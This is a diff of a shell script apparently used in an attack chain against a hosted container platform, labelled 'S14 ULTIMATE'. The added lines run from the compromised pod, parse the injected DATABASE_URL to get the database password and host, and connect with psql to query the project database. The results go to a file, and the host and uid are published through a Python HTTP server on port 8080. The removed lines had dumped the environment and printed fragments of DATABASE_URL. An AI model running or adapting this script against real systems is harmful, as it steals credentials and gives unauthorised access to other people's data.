@@ -1,15 +1,20 @@
 #!/bin/sh
-# S14 FINAL CHAIN: pod root + PG integration (DATABASE_URL injected)
+# S14 ULTIMATE: pod root -> psql via injected DATABASE_URL -> read project DB
 {
-  echo "=== ENV (integrated) ==="
-  env | sort | head -40
-  echo "=== DATABASE_URL (redacted proof) ==="
+  echo "=== POD ==="
+  id; hostname
+  echo "=== PG CONNECT (injected DATABASE_URL) ==="
   if [ -n "$DATABASE_URL" ]; then
-    echo "len=${#DATABASE_URL} head=${DATABASE_URL:0:30} tail=${DATABASE_URL: -12}"
-    echo "host part: $(echo $DATABASE_URL | cut -d@ -f2 | cut -d/ -f1)"
+    echo "url host: $(echo $DATABASE_URL | cut -d@ -f2 | cut -d/ -f1)"
+    PGPASSWORD=$(echo $DATABASE_URL | sed -n 's|.*:.*://[^:]*:\([^@]*\)@.*|\1|p')
+    PGB=$(echo $DATABASE_URL | cut -d@ -f2 | cut -d: -f1)
+    PGPORT=$(echo $DATABASE_URL | cut -d@ -f2 | cut -d/ -f1 | cut -d: -f2)
+    PGDATABASE=$(echo $DATABASE_URL | cut -d/ -f3)
+    echo "user=avnadmin host=$PGB port=$PGPORT db=$PGDATABASE pwlen=${#PGPASSWORD}"
+    timeout 15 psql "host=$PGB port=$PGPORT user=avnadmin dbname=$PGDATABASE sslmode=require" -c "SELECT current_user, version(); SELECT count(*) AS tables FROM information_schema.tables WHERE table_schema='public';" 2>&1 | head -25
   else
     echo "NO DATABASE_URL"
   fi
-} > /app/chain3.txt 2>&1
-printf 'CHAIN3 host=%s uid=%s db=%s\n' "$(hostname)" "$(id -u)" "${DATABASE_URL:0:25}" > /app/index.html
+} > /app/chain4.txt 2>&1
+printf 'CHAIN4 host=%s uid=%s\n' "$(hostname)" "$(id -u)" > /app/index.html
 exec python3 -m http.server 8080
